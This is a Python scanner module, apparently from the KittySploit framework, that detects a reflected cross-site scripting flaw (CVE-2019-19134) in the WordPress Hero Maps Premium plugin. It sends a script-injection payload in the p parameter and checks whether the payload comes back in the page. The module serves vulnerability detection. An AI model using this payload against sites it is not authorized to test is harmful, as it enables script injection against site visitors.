#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Hero Maps Premium plugin 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Hero Maps Premium <=2.2.1 - Cross-Site Scripting Detection',
        'description': 'WordPress Hero Maps Premium plugin 2.2.1 and prior contains an unauthenticated reflected cross-site scripting vulnerability via the views/dashboard/index.php p parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wpscan', 'wordpress', 'xss', 'wp-plugin', 'maps', 'heroplugins', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/d179f7fe-e3e7-44b3-9bf8-aab2e90dbe01',
            'https://www.hooperlabs.xyz/disclosures/cve-2019-19134.php',
            'https://heroplugins.com/product/maps/',
            'https://heroplugins.com/changelogs/hmaps/changelog.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-19134',
        ],
        'cve': 'CVE-2019-19134',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/hmapsprem/views/dashboard/index.php?p=/wp-content/plugins/hmapsprem/foo%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('foo"></script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Hero Maps Premium <=2.2.1 - Cross-Site Scripting detected",
                path='/wp-content/plugins/hmapsprem/views/dashboard/index.php?p=/wp-content/plugins/hmapsprem/foo%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

